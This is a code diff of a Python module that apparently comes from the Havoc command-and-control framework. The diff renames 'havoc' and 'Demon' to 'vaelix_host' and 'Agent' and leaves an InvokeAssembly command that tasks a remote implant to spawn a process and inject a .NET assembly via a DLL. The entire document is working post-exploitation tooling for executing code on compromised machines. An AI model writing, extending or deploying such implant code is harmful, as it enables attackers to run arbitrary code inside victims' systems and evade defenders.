@@ -1,22 +1,22 @@
 
-from havoc import Demon, RegisterCommand
+from vaelix_host import Agent, RegisterCommand
 
-def InvokeAssembly( demonID, *param ):
+def InvokeAssembly( agentID, *param ):
     TaskID   : str    = None
-    demon    : Demon  = None
+    agent    : Agent  = None
     Assembly : str    = None
     packer   = Packer()
 
-    demon  = Demon( demonID )
+    agent  = Agent( agentID )
 
-    if demon.ProcessArch == 'x86':
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
+    if agent.ProcessArch == 'x86':
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "x86 is not supported" )
         return False
 
-    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, "Tasked demon spawn and inject an assembly executable" )
+    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, "Tasked agent spawn and inject an assembly executable" )
     
     if len( param ) < 2:
-        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough arguments")
+        agent.ConsoleWrite(agent.CONSOLE_ERROR, "Not enough arguments")
         return
 
     try:
@@ -28,12 +28,12 @@ def InvokeAssembly( demonID, *param ):
         packer.addstr( " " + ''.join( param[ 1: ] ) )
 
     except OSError:
-        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Failed to open assembly file: " + param[ 0 ] )
+        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Failed to open assembly file: " + param[ 0 ] )
         return
 
     arg = packer.getbuffer() 
 
-    demon.DllSpawn( TaskID, f"bin/InvokeAssembly.{demon.ProcessArch}.dll", arg )
+    agent.DllSpawn( TaskID, f"bin/InvokeAssembly.{agent.ProcessArch}.dll", arg )
 
     return TaskID
 
